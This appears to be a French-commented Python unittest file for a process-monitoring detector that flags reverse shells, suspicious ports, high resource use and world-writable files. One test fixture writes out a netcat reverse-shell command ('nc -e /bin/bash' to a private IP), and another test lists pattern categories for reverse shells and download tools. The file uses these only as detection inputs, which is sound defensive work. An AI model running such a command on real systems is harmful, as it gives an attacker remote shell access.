#!/usr/bin/env python3
"""
Tests unitaires pour la surveillance des processus
"""

import unittest
from unittest.mock import patch, MagicMock, call
from datetime import datetime
from use_cases.process_monitoring import (
    ProcessMonitor, 
    ProcessInfo, 
    run_process_monitoring
)
from domain.entities import Alert


class TestProcessInfo(unittest.TestCase):
    """Tests pour la classe ProcessInfo"""
    
    def test_process_info_creation(self):
        """Test de création d'un ProcessInfo"""
        connections = [("127.0.0.1", 8080, "192.168.1.100", 80, "ESTABLISHED")]
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=25.5,
            memory_percent=15.2,
            connections=connections
        )
        
        self.assertEqual(process.pid, 12345)
        self.assertEqual(process.name, "test-process")
        self.assertEqual(process.user, "testuser")
        self.assertEqual(process.command, "python test.py")
        self.assertEqual(process.cpu_percent, 25.5)
        self.assertEqual(process.memory_percent, 15.2)
        self.assertEqual(process.connections, connections)


class TestProcessMonitor(unittest.TestCase):
    """Tests pour la classe ProcessMonitor"""
    
    def setUp(self):
        """Configuration initiale pour chaque test"""
        self.monitor = ProcessMonitor()
    
    def test_suspicious_patterns_initialization(self):
        """Test de l'initialisation des patterns suspects"""
        expected_patterns = [
            'reverse_shell', 'download_tools', 'privilege_escalation',
            'file_manipulation', 'network_tools', 'crypto_mining'
        ]
        
        for pattern in expected_patterns:
            self.assertIn(pattern, self.monitor.suspicious_patterns)
            self.assertIsNotNone(self.monitor.suspicious_patterns[pattern])
    
    def test_whitelist_commands_initialization(self):
        """Test de l'initialisation des commandes whitelist"""
        expected_commands = [
            'sshd', 'systemd', 'cron', 'rsyslogd', 'ntpd', 'snmpd',
            'apache2', 'nginx', 'mysql', 'postgresql', 'redis-server'
        ]
        
        for command in expected_commands:
            self.assertIn(command, self.monitor.whitelist_commands)
    
    def test_suspicious_ports_initialization(self):
        """Test de l'initialisation des ports suspects"""
        expected_ports = {22, 23, 3389, 5900, 5901, 8080, 8443, 9000}
        self.assertEqual(self.monitor.suspicious_ports, expected_ports)
    
    @patch('subprocess.run')
    def test_get_active_processes_success(self, mock_run):
        """Test de la récupération réussie des processus actifs"""
        # Mock de la sortie de ps
        mock_output = """user1 1234 25.5 15.2 /usr/bin/process1
user2 5678 10.0 8.5 /usr/bin/process2
root 9999 5.0 3.2 /usr/sbin/systemd"""
        
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = mock_output
        
        processes = self.monitor.get_active_processes("test-server")
        
        self.assertEqual(len(processes), 2)  # root est ignoré
        self.assertEqual(processes[0].user, "user1")
        self.assertEqual(processes[0].pid, 1234)
        self.assertEqual(processes[0].cpu_percent, 25.5)
        self.assertEqual(processes[0].memory_percent, 15.2)
        
        # Vérification de l'appel à ps
        mock_run.assert_called_once_with(
            ['ps', 'aux', '--no-headers'],
            capture_output=True,
            text=True,
            timeout=30
        )
    
    @patch('subprocess.run')
    def test_get_active_processes_failure(self, mock_run):
        """Test de la gestion des échecs de récupération des processus"""
        mock_run.return_value.returncode = 1
        
        processes = self.monitor.get_active_processes("test-server")
        
        self.assertEqual(processes, [])
    
    @patch('subprocess.run')
    def test_get_active_processes_timeout(self, mock_run):
        """Test de la gestion des timeouts"""
        mock_run.side_effect = TimeoutError("Command timed out")
        
        processes = self.monitor.get_active_processes("test-server")
        
        self.assertEqual(processes, [])
    
    @patch('subprocess.run')
    def test_get_network_connections_success(self, mock_run):
        """Test de la récupération réussie des connexions réseau"""
        # Mock de la sortie de netstat
        mock_output = """tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1234/python
tcp        0      0 192.168.1.100:22     192.168.1.50:12345     ESTABLISHED 5678/sshd"""
        
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = mock_output
        
        connections = self.monitor.get_network_connections(1234)
        
        self.assertEqual(len(connections), 1)
        local_addr, local_port, remote_addr, remote_port, status = connections[0]
        self.assertEqual(local_addr, "127.0.0.1")
        self.assertEqual(local_port, 8080)
        self.assertEqual(remote_addr, "0.0.0.0")
        self.assertEqual(remote_port, 0)
        self.assertEqual(status, "LISTEN")
    
    @patch('subprocess.run')
    def test_get_network_connections_failure(self, mock_run):
        """Test de la gestion des échecs de récupération des connexions réseau"""
        mock_run.return_value.returncode = 1
        
        connections = self.monitor.get_network_connections(1234)
        
        self.assertEqual(connections, [])
    
    def test_analyze_process_behavior_suspicious_patterns(self):
        """Test de l'analyse des comportements suspects basés sur les patterns"""
        process = ProcessInfo(
            pid=12345,
            name="nc",
            user="testuser",
            command="nc -e /bin/bash 192.168.1.100 4444",
            cpu_percent=10.0,
            memory_percent=5.0,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.rule, "suspicious_reverse_shell")
        self.assertEqual(alert.level, "high")
        self.assertIn("reverse shell", alert.message.lower())
        self.assertEqual(alert.username, "testuser")
    
    def test_analyze_process_behavior_network_connections(self):
        """Test de l'analyse des connexions réseau suspectes"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=10.0,
            memory_percent=5.0,
            connections=[("127.0.0.1", 8080, "192.168.1.100", 22, "ESTABLISHED")]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.rule, "suspicious_network_connection")
        self.assertEqual(alert.level, "medium")
        self.assertIn("22", alert.message)  # Port SSH suspect
    
    def test_analyze_process_behavior_high_resource_usage(self):
        """Test de l'analyse de l'utilisation excessive des ressources"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=85.0,
            memory_percent=90.0,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.rule, "high_resource_usage")
        self.assertEqual(alert.level, "medium")
        self.assertIn("85.0%", alert.message)
        self.assertIn("90.0%", alert.message)
    
    def test_analyze_process_behavior_no_alerts(self):
        """Test de l'analyse d'un processus normal sans alertes"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=10.0,
            memory_percent=5.0,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 0)
    
    @patch('subprocess.run')
    def test_check_file_activity_success(self, mock_run):
        """Test de la vérification réussie de l'activité des fichiers"""
        # Mock de la sortie de ls
        mock_output = """-rwxrwxrwx 1 root root 1024 Jan 15 10:30 suspicious.sh
-rw-r--r-- 1 user user 512 Jan 15 10:31 normal.txt"""
        
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = mock_output
        
        alerts = self.monitor.check_file_activity("test-server")
        
        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.rule, "suspicious_file_permissions")
        self.assertEqual(alert.level, "high")
        self.assertIn("777", alert.message)
    
    @patch('subprocess.run')
    def test_check_file_activity_no_suspicious_files(self, mock_run):
        """Test de la vérification sans fichiers suspects"""
        mock_output = """-rw-r--r-- 1 user user 512 Jan 15 10:31 normal.txt
-rw-r--r-- 1 user user 256 Jan 15 10:32 another.txt"""
        
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = mock_output
        
        alerts = self.monitor.check_file_activity("test-server")
        
        self.assertEqual(len(alerts), 0)
    
    @patch('subprocess.run')
    def test_check_file_activity_failure(self, mock_run):
        """Test de la gestion des échecs de vérification des fichiers"""
        mock_run.return_value.returncode = 1
        
        alerts = self.monitor.check_file_activity("test-server")
        
        self.assertEqual(alerts, [])
    
    def test_monitor_processes_integration(self):
        """Test d'intégration de la surveillance des processus"""
        # Mock des méthodes internes
        with patch.object(self.monitor, 'get_active_processes') as mock_get_processes, \
             patch.object(self.monitor, 'get_network_connections') as mock_get_connections, \
             patch.object(self.monitor, 'analyze_process_behavior') as mock_analyze:
            
            # Configuration des mocks
            mock_process = ProcessInfo(
                pid=12345,
                name="test-process",
                user="testuser",
                command="python test.py",
                cpu_percent=10.0,
                memory_percent=5.0,
                connections=[]
            )
            mock_get_processes.return_value = [mock_process]
            mock_get_connections.return_value = []
            mock_analyze.return_value = []
            
            # Exécution de la surveillance
            alerts = self.monitor.monitor_processes("test-server")
            
            # Vérifications
            mock_get_processes.assert_called_once_with("test-server")
            mock_get_connections.assert_called_once_with(12345)
            mock_analyze.assert_called_once_with(mock_process)
            self.assertEqual(alerts, [])


class TestProcessMonitoringIntegration(unittest.TestCase):
    """Tests d'intégration pour la surveillance des processus"""
    
    @patch('use_cases.process_monitoring.ProcessMonitor')
    def test_run_process_monitoring(self, mock_monitor_class):
        """Test de la fonction principale de surveillance des processus"""
        # Configuration du mock
        mock_monitor = MagicMock()
        mock_monitor_class.return_value = mock_monitor
        
        mock_monitor.monitor_processes.return_value = []
        mock_monitor.check_file_activity.return_value = []
        
        # Exécution de la fonction
        alerts = run_process_monitoring("test-server")
        
        # Vérifications
        mock_monitor_class.assert_called_once()
        mock_monitor.monitor_processes.assert_called_once_with("test-server")
        mock_monitor.check_file_activity.assert_called_once_with("test-server")
        self.assertEqual(alerts, [])
    
    @patch('use_cases.process_monitoring.ProcessMonitor')
    def test_run_process_monitoring_with_alerts(self, mock_monitor_class):
        """Test de la fonction avec des alertes générées"""
        # Configuration du mock
        mock_monitor = MagicMock()
        mock_monitor_class.return_value = mock_monitor
        
        # Création d'alertes de test
        process_alert = Alert(
            server_name="test-server",
            log_source="process_monitoring",
            rule="suspicious_reverse_shell",
            level="high",
            message="Test process alert"
        )
        file_alert = Alert(
            server_name="test-server",
            log_source="file_monitoring",
            rule="suspicious_file_permissions",
            level="high",
            message="Test file alert"
        )
        
        mock_monitor.monitor_processes.return_value = [process_alert]
        mock_monitor.check_file_activity.return_value = [file_alert]
        
        # Exécution de la fonction
        alerts = run_process_monitoring("test-server")
        
        # Vérifications
        self.assertEqual(len(alerts), 2)
        self.assertIn(process_alert, alerts)
        self.assertIn(file_alert, alerts)


class TestProcessMonitorEdgeCases(unittest.TestCase):
    """Tests des cas limites pour ProcessMonitor"""
    
    def setUp(self):
        """Configuration initiale pour chaque test"""
        self.monitor = ProcessMonitor()
    
    def test_process_with_empty_command(self):
        """Test avec un processus ayant une commande vide"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="",
            cpu_percent=10.0,
            memory_percent=5.0,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 0)
    
    def test_process_with_none_values(self):
        """Test avec un processus ayant des valeurs None"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=0.0,
            memory_percent=0.0,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 0)
    
    def test_process_with_very_high_resource_usage(self):
        """Test avec un processus ayant une utilisation très élevée des ressources"""
        process = ProcessInfo(
            pid=12345,
            name="test-process",
            user="testuser",
            command="python test.py",
            cpu_percent=99.9,
            memory_percent=99.9,
            connections=[]
        )
        
        alerts = self.monitor.analyze_process_behavior(process)
        
        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.rule, "high_resource_usage")
        self.assertIn("99.9%", alert.message)


if __name__ == '__main__':
    unittest.main() 